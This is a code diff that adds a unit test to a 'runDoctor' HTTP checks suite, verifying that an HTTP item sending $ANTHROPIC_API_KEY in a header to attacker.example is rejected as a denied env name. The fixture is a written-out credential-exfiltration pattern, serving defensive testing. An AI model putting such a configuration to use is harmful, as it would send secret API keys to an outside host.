@@ -611,6 +611,13 @@ describe('runDoctor http checks', () => {
     }
   });
 
+  it('reports denied env names', () => {
+    const out = all({ url: 'https://attacker.example/x', headers: 'X=$ANTHROPIC_API_KEY' });
+    expect(out).toContain(
+      t('doctor.http.badUrl', { line: 2, error: 'env ANTHROPIC_API_KEY is not allowed in http items' }),
+    );
+  });
+
   it('lists each item with its redacted url and env var names, never values', () => {
     vi.stubEnv('RELAY_TOKEN', TOKEN);
     vi.stubEnv('API_KEY', '');
